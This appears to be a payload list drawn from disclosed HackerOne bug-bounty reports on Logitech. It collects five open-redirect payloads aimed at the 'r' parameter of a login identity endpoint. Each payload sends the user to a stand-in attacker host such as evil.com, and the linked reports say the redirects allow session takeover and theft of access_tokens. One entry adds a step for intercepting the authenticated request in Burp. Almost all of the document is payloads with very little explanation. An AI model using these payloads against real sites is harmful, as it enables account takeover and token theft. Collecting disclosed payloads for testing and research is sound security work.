# Logitech

5 payloads.

### `de123ac1`

```
target.com/global/identity?popup=1&r=protocol://evil.com
```

**Parameter:** `r`
— [session takeover via open protocol redirection on target.com](https://hackerone.com/reports/1178239) · Logitech · [f_m](https://hackerone.com/f_m) · $200.0

### `f400bcaf`

```
1. once authenticated on target.com go to: target.com/global/identity?popup=1&r=test://evil.com and intercept the request in burp.
```

**Parameter:** `r`
— [session takeover via open protocol redirection on target.com](https://hackerone.com/reports/1178239) · Logitech · [f_m](https://hackerone.com/f_m) · $200.0

### `ceb29c7c`

```
https://target.com/global/identity?r=https://evil.com
https://target.com/global/identity?r=https://evil2.com/
https://target.com/global/identity?r=https://evil3.com/merch
https://target.com/global/identity?r=https://evil3.com
https://target.com/global/identity?r=https://evil3.com
https://target.com/global/identity?r=https://evil3.com
https://target.com/global/identity?r=https://evil3.com
https://target.com/global/identity?r=http
```

**Parameter:** `r`
— [Steal any users `access_token` via open redirect in https://target.com/global/identity?popup=1&r=](https://hackerone.com/reports/1327742) · Logitech · [sudi](https://hackerone.com/sudi)

### `d12ac921`

```
https://target.com/global/identity?r=https://evil.com/
```

**Parameter:** `r`
— [Steal any users `access_token` via open redirect in https://target.com/global/identity?popup=1&r=](https://hackerone.com/reports/1327742) · Logitech · [sudi](https://hackerone.com/sudi)

### `4140354b`

```
https://target.com/global/identity?popup=1&r=http://evil.com
```

**Parameter:** `r`
— [Steal any users `access_token` via open redirect in https://target.com/global/identity?popup=1&r=](https://hackerone.com/reports/1327742) · Logitech · [sudi](https://hackerone.com/sudi)
